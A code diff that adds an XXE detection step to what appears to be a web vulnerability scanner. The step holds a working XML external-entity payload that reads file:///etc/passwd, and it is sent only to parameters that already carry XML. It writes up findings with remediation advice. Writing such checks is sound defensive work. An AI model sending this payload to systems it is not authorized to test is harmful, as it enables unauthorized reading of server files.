@@ -896,10 +896,16 @@ _SSRF_METADATA_LEAK_RE = re.compile(
     r"placement/availability-zone",
     re.I,
 )
+# A parameter's ORIGINAL (baseline) value starting with an XML declaration
+# or an opening tag — real evidence this exact parameter already carries
+# XML content through to the server's own parser, rather than guessing
+# XML onto an arbitrary string/numeric parameter that was never going to
+# accept it.
+_XML_SHAPED_RE = re.compile(r"^\s*(<\?xml|<[a-zA-Z])")
 
 
 # ---------------------------------------------------------------------------
-# Per-parameter mutation loop (steps 1-11)
+# Per-parameter mutation loop (steps 1-12)
 # ---------------------------------------------------------------------------
 
 def _test_param(ctx, parts, pairs, pname, baseline):
@@ -1630,6 +1636,68 @@ def _test_param(ctx, parts, pairs, pname, baseline):
                                     "a user-controlled URL reach the fetch client unvalidated."),
                     )
                     break
+
+    if budget.exhausted():
+        return
+
+    # --- 12. XXE (only params whose ORIGINAL value already looks like XML) ---
+    # Fits the existing GET-only per-parameter architecture with no new
+    # request capability at all — gated on the parameter's OWN baseline
+    # value already looking like XML (a leading `<?xml` or opening tag),
+    # rather than trying it on every parameter, since that's real evidence
+    # the endpoint already accepts and parses XML content through this
+    # exact parameter, the same "only test what the target already
+    # demonstrated it does" discipline the SSRF metadata check above uses.
+    # A completely different, and genuinely more common in practice than
+    # it sounds, surface than a POST-body XML upload: SOAP-over-GET,
+    # XML-in-query-param config/preview validators, and legacy
+    # XML-RPC-style endpoints are real, if less common than POST-based
+    # XXE. Same zero-ambiguity /etc/passwd content signature the
+    # path-traversal and SSRF file:// checks already use — no differential
+    # or blind-XXE (out-of-band DTD, error-based data exfiltration via
+    # external DTD) tier, since those need infrastructure (a listener the
+    # operator controls) this tool doesn't have, matching the same
+    # honest-gap-over-guess call already made for blind SSRF above.
+    if _XML_SHAPED_RE.match(orig_value or ""):
+        xxe_payload = (
+            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
+            '<r>&x;</r>'
+        )
+        url_x = _build_url(parts, _with_param(pairs, pname, xxe_payload))
+        resp_x = _polite_get(budget, delay, url_x, timeout)
+        if resp_x is not None and re.search(r"root:.*:0:0:", resp_x.text or ""):
+            _persist(
+                ctx,
+                title=f"XML External Entity (XXE) Injection via '{pname}' parameter",
+                severity="critical",
+                category="XML External Entity Injection",
+                url=url_x, param=pname, payload=xxe_payload,
+                description=(
+                    f"'{pname}' already carried XML content in the baseline request, and "
+                    f"submitting a DOCTYPE declaring an external entity pointing at "
+                    f"file:///etc/passwd caused the server's XML parser to resolve it and "
+                    f"return real local filesystem content — /etc/passwd content (matching "
+                    f"the root:...:0:0: signature) came back in the live response, confirmed "
+                    f"by direct content matching. The parser is resolving external entities "
+                    f"from attacker-controlled DTD content, a common misconfiguration in "
+                    f"XML libraries that don't disable this by default (unlike Python's own "
+                    f"stdlib XML parsers, which structurally cannot do this at all — this is "
+                    f"a library-choice/configuration bug, not a language-level gap)."
+                ),
+                baseline_snippet=_ctx_snippet(baseline["body"], ""),
+                mutated_snippet=_ctx_snippet(resp_x.text or "", "root:"),
+                impact=("Arbitrary local file read via the XML parser's own entity "
+                       "resolution — frequently escalates to SSRF (an external entity's "
+                       "SYSTEM identifier can be an http:// URL, not just file://, reaching "
+                       "the same internal targets the SSRF check above does) or, on "
+                       "vulnerable parser/library combinations, denial of service via "
+                       "entity expansion (\"billion laughs\")."),
+                remediation=("Disable external entity and DTD resolution entirely in the XML "
+                            "parser configuration — for lxml specifically, never set "
+                            "resolve_entities=True; for other libraries, look for the "
+                            "equivalent 'disable external entities' / 'disallow DOCTYPE' "
+                            "setting and treat it as mandatory, not optional."),
+            )
 
 
 # ---------------------------------------------------------------------------
